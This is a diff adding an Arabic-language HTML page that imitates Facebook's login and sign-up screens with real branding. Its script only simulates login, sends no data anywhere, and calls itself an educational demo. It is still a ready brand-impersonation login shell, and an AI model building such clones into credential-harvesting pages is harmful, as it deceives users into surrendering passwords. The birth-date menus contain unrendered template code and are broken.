@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول | فيسبوك</title>
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📘</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-blue: #1877f2;
+            --primary-green: #42b72a;
+            --bg-gray: #f0f2f5;
+            --text-dark: #1c1e21;
+            --border-gray: #dddfe2;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-gray);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Loading Screen */
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: #333;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 10000;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast.success { background: #42b72a; }
+        .toast.error { background: #ff4444; }
+
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+            opacity: 0;
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .left-section {
+            flex: 1;
+            padding-top: 40px;
+            animation: slideInRight 0.8s ease;
+        }
+
+        @keyframes slideInRight {
+            from {
+                opacity: 0;
+                transform: translateX(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .logo {
+            color: var(--primary-blue);
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            letter-spacing: -2px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .tagline {
+            font-size: 28px;
+            line-height: 32px;
+            color: var(--text-dark);
+            max-width: 500px;
+        }
+
+        .right-section {
+            width: 396px;
+            animation: slideInLeft 0.8s ease;
+        }
+
+        @keyframes slideInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .login-box:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15), 0 12px 24px rgba(0, 0, 0, 0.15);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-gray);
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .input-field.error {
+            border-color: #ff4444;
+            box-shadow: 0 0 0 2px #ffe6e6;
+        }
+
+        .error-message {
+            color: #ff4444;
+            font-size: 13px;
+            text-align: right;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .login-btn.loading {
+            color: transparent;
+        }
+
+        .login-btn.loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            margin-left: -10px;
+            margin-top: -10px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .forgot-password {
+            display: block;
+            margin: 16px 0;
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #166fe5;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: "أو";
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 0 10px;
+            color: #96999e;
+            font-size: 12px;
+        }
+
+        .create-account-btn {
+            background-color: var(--primary-green);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .create-account-btn:hover {
+            background-color: #36a420;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(66, 183, 42, 0.4);
+        }
+
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+            animation: fadeIn 1s ease 0.5s both;
+        }
+
+        .create-page a {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+            color: var(--primary-blue);
+        }
+
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-overlay.show {
+            display: flex;
+            animation: fadeIn 0.3s;
+        }
+
+        .modal {
+            background: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 432px;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.3s;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border-gray);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-title {
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .modal-subtitle {
+            color: #606770;
+            font-size: 15px;
+            margin-top: 4px;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #606770;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .close-btn:hover {
+            background: #f0f2f5;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .name-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .select-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .select-box {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid var(--border-gray);
+            border-radius: 4px;
+            font-size: 15px;
+        }
+
+        .gender-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .gender-option {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid var(--border-gray);
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .gender-option:hover {
+            background: #f0f2f5;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary-green);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+
+        .signup-btn:hover {
+            background: #36a420;
+        }
+
+        /* Dashboard (Hidden by default) */
+        #dashboard {
+            display: none;
+            min-height: 100vh;
+            background: var(--bg-gray);
+        }
+
+        .nav-bar {
+            background: white;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-logo {
+            color: var(--primary-blue);
+            font-size: 40px;
+            font-weight: bold;
+        }
+
+        .nav-user {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--primary-blue);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .logout-btn {
+            background: #e4e6eb;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: #d8dadf;
+        }
+
+        .dashboard-content {
+            max-width: 680px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+
+        .welcome-card {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            animation: slideUp 0.5s;
+        }
+
+        .welcome-card h2 {
+            color: var(--text-dark);
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .welcome-card p {
+            color: #65676b;
+            font-size: 16px;
+        }
+
+        footer {
+            background-color: white;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #dddfe2;
+            margin-bottom: 8px;
+        }
+
+        .languages a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.3s;
+        }
+
+        .languages a:hover {
+            text-decoration: underline;
+            color: var(--primary-blue);
+        }
+
+        .languages a.active {
+            color: #737373;
+            font-weight: bold;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            line-height: 1.6;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #737373;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                padding-top: 40px;
+            }
+
+            .left-section {
+                padding-top: 0;
+            }
+
+            .tagline {
+                margin: 0 auto;
+                font-size: 24px;
+            }
+
+            .right-section {
+                width: 100%;
+                max-width: 400px;
+            }
+
+            .name-row {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 48px;
+            }
+            
+            .tagline {
+                font-size: 20px;
+            }
+
+            .modal-title {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen">
+        <div class="loader"></div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast"></div>
+
+    <!-- Login Page -->
+    <div id="loginPage">
+        <div class="container">
+            <div class="left-section">
+                <h1 class="logo">facebook</h1>
+                <p class="tagline">يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+            </div>
+            
+            <div class="right-section">
+                <div class="login-box">
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <input type="text" id="email" class="input-field" placeholder="البريد الإلكتروني أو رقم الهاتف">
+                            <div class="error-message" id="emailError">يرجى إدخال البريد الإلكتروني أو رقم الهاتف</div>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" id="password" class="input-field" placeholder="كلمة السر">
+                            <div class="error-message" id="passwordError">يرجى إدخال كلمة السر</div>
+                        </div>
+                        <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+                    </form>
+                    
+                    <a href="#" class="forgot-password" onclick="showToast('قريباً: استعادة كلمة المرور', 'info')">هل نسيت كلمة السر؟</a>
+                    
+                    <div class="divider"></div>
+                    
+                    <button class="create-account-btn" onclick="openModal()">إنشاء حساب جديد</button>
+                </div>
+                
+                <div class="create-page">
+                    <a href="#" onclick="showToast('قريباً: إنشاء صفحة', 'info')">إنشاء صفحة</a> لفرقة موسيقية أو مشروع تجاري أو علامة تجارية.
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <div class="footer-content">
+                <div class="languages">
+                    <a href="#" class="active">العربية</a>
+                    <a href="#" onclick="changeLanguage('en')">English (UK)</a>
+                    <a href="#" onclick="changeLanguage('fr')">Français (France)</a>
+                    <a href="#" onclick="changeLanguage('es')">Español</a>
+                    <a href="#" onclick="changeLanguage('pt')">Português (Brasil)</a>
+                    <a href="#" onclick="changeLanguage('it')">Italiano</a>
+                    <a href="#" onclick="changeLanguage('de')">Deutsch</a>
+                    <a href="#" onclick="changeLanguage('hi')">हिन्दी</a>
+                    <a href="#" onclick="changeLanguage('zh')">中文(简体)</a>
+                    <a href="#" onclick="changeLanguage('ja')">日本語</a>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">التسجيل</a>
+                    <a href="#">تسجيل الدخول</a>
+                    <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a>
+                    <a href="#">Watch</a>
+                    <a href="#">الأماكن</a>
+                    <a href="#">الألعاب</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Meta Pay</a>
+                    <a href="#">Oculus</a>
+                    <a href="#">Portal</a>
+                    <a href="#">Instagram</a>
+                    <a href="#">Bulletin</a>
+                    <a href="#">المحلية</a>
+                    <a href="#">حملات التبرع</a>
+                    <a href="#">الخدمات</a>
+                    <a href="#">مركز معلومات التصويت</a>
+                    <a href="#">السياسات</a>
+                    <a href="#">مركز الخصوصية</a>
+                    <a href="#">المجموعات</a>
+                    <a href="#">حول</a>
+                    <a href="#">إنشاء إعلان</a>
+                    <a href="#">إنشاء صفحة</a>
+                    <a href="#">المطورون</a>
+                    <a href="#">الوظائف</a>
+                    <a href="#">الخصوصية</a>
+                    <a href="#">ملفات تعريف الارتباط</a>
+                    <a href="#">اختيارات الإعلانات</a>
+                    <a href="#">الشروط</a>
+                    <a href="#">المساعدة</a>
+                </div>
+                
+                <div class="copyright">Meta © 2024</div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Sign Up Modal -->
+    <div class="modal-overlay" id="signupModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div>
+                    <div class="modal-title">إنشاء حساب جديد</div>
+                    <div class="modal-subtitle">سريع وسهل.</div>
+                </div>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form id="signupForm">
+                    <div class="name-row">
+                        <input type="text" class="input-field" placeholder="الاسم الأول" required>
+                        <input type="text" class="input-field" placeholder="اسم العائلة" required>
+                    </div>
+                    <input type="text" class="input-field" placeholder="رقم الهاتف أو البريد الإلكتروني" required style="margin-bottom: 12px;">
+                    <input type="password" class="input-field" placeholder="كلمة السر الجديدة" required style="margin-bottom: 12px;">
+                    
+                    <div style="text-align: right; margin-bottom: 5px; font-size: 12px; color: #606770;">تاريخ الميلاد</div>
+                    <div class="select-group">
+                        <select class="select-box" required>
+                            <option value="">اليوم</option>
+                            ${Array.from({length: 31}, (_, i) => `<option value="${i+1}">${i+1}</option>`).join('')}
+                        </select>
+                        <select class="select-box" required>
+                            <option value="">الشهر</option>
+                            <option>يناير</option>
+                            <option>فبراير</option>
+                            <option>مارس</option>
+                            <option>أبريل</option>
+                            <option>مايو</option>
+                            <option>يونيو</option>
+                            <option>يوليو</option>
+                            <option>أغسطس</option>
+                            <option>سبتمبر</option>
+                            <option>أكتوبر</option>
+                            <option>نوفمبر</option>
+                            <option>ديسمبر</option>
+                        </select>
+                        <select class="select-box" required>
+                            <option value="">السنة</option>
+                            ${Array.from({length: 100}, (_, i) => `<option value="${2024-i}">${2024-i}</option>`).join('')}
+                        </select>
+                    </div>
+
+                    <div style="text-align: right; margin-bottom: 5px; font-size: 12px; color: #606770;">الجنس</div>
+                    <div class="gender-group">
+                        <label class="gender-option">
+                            <span>أنثى</span>
+                            <input type="radio" name="gender" value="female">
+                        </label>
+                        <label class="gender-option">
+                            <span>ذكر</span>
+                            <input type="radio" name="gender" value="male">
+                        </label>
+                        <label class="gender-option">
+                            <span>مخصص</span>
+                            <input type="radio" name="gender" value="custom">
+                        </label>
+                    </div>
+
+                    <p style="font-size: 11px; color: #777; text-align: right; margin: 10px 0;">
+                        بالنقر على "إنشاء حساب"، فإنك توافق على شروطنا وسياسة البيانات وسياسة ملفات تعريف الارتباط.
+                    </p>
+
+                    <button type="submit" class="signup-btn">إنشاء حساب</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard (After Login) -->
+    <div id="dashboard">
+        <nav class="nav-bar">
+            <div class="nav-logo">facebook</div>
+            <div class="nav-user">
+                <span id="userName">مستخدم</span>
+                <div class="user-avatar" id="userAvatar">م</div>
+                <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
+            </div>
+        </nav>
+        
+        <div class="dashboard-content">
+            <div class="welcome-card">
+                <h2>مرحباً بك في فيسبوك! 👋</h2>
+                <p>تم تسجيل دخولك بنجاح. هذه صفحة رئيسية تجريبية.</p>
+                <div style="margin-top: 20px; padding: 20px; background: #f0f2f5; border-radius: 8px;">
+                    <p style="color: #65676b;">هذا مثال تعليمي فقط. لا يتم حفظ أي بيانات حقيقية.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Hide loading screen after page loads
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                }, 500);
+            }, 800);
+        });
+
+        // Toast Notification System
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${type}`;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Modal Functions
+        function openModal() {
+            document.getElementById('signupModal').classList.add('show');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('signupModal').classList.remove('show');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('signupModal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('signupModal')) {
+                closeModal();
+            }
+        });
+
+        // Login Form Validation
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email');
+            const password = document.getElementById('password');
+            const loginBtn = document.getElementById('loginBtn');
+            let isValid = true;
+
+            // Reset errors
+            document.querySelectorAll('.error-message').forEach(el => el.classList.remove('show'));
+            document.querySelectorAll('.input-field').forEach(el => el.classList.remove('error'));
+
+            // Validate email
+            if (!email.value.trim()) {
+                document.getElementById('emailError').classList.add('show');
+                email.classList.add('error');
+                isValid = false;
+            }
+
+            // Validate password
+            if (!password.value.trim()) {
+                document.getElementById('passwordError').classList.add('show');
+                password.classList.add('error');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            // Simulate login process
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+
+            // Simulate API call
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            // Success - Show dashboard
+            loginBtn.classList.remove('loading');
+            loginBtn.disabled = false;
+            
+            showToast('تم تسجيل الدخول بنجاح!', 'success');
+            
+            setTimeout(() => {
+                document.getElementById('loginPage').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                
+                // Set user name from email
+                const userName = email.value.split('@')[0];
+                document.getElementById('userName').textContent = userName;
+                document.getElementById('userAvatar').textContent = userName.charAt(0).toUpperCase();
+            }, 1000);
+        });
+
+        // Sign Up Form
+        document.getElementById('signupForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = e.target.querySelector('.signup-btn');
+            const originalText = btn.textContent;
+            
+            btn.textContent = 'جاري الإنشاء...';
+            btn.disabled = true;
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            showToast('تم إنشاء الحساب بنجاح!', 'success');
+            closeModal();
+            
+            btn.textContent = originalText;
+            btn.disabled = false;
+            
+            // Clear form
+            e.target.reset();
+        });
+
+        // Logout Function
+        function logout() {
+            showToast('تم تسجيل الخروج', 'success');
+            setTimeout(() => {
+                document.getElementById('dashboard').style.display = 'none';
+                document.getElementById('loginPage').style.display = 'block';
+                document.getElementById('loginForm').reset();
+            }, 1000);
+        }
+
+        // Language Change (Simulation)
+        function changeLanguage(lang) {
+            showToast(`تغيير اللغة إلى: ${lang} (قريباً)`, 'info');
+        }
+
+        // Input focus effects
+        document.querySelectorAll('.input-field').forEach(input => {
+            input.addEventListener('focus', () => {
+                input.classList.remove('error');
+                const errorMsg = input.parentElement.querySelector('.error-message');
+                if (errorMsg) errorMsg.classList.remove('show');
+            });
+        });
+
+        // Remember me functionality (using localStorage)
+        window.addEventListener('beforeunload', () => {
+            const email = document.getElementById('email').value;
+            if (email) {
+                localStorage.setItem('rememberedEmail', email);
+            }
+        });
+
+        window.addEventListener('load', () => {
+            const rememberedEmail = localStorage.getItem('rememberedEmail');
+            if (rememberedEmail) {
+                document.getElementById('email').value = rememberedEmail;
+            }
+        });
+    </script>
+</body>
+</html>
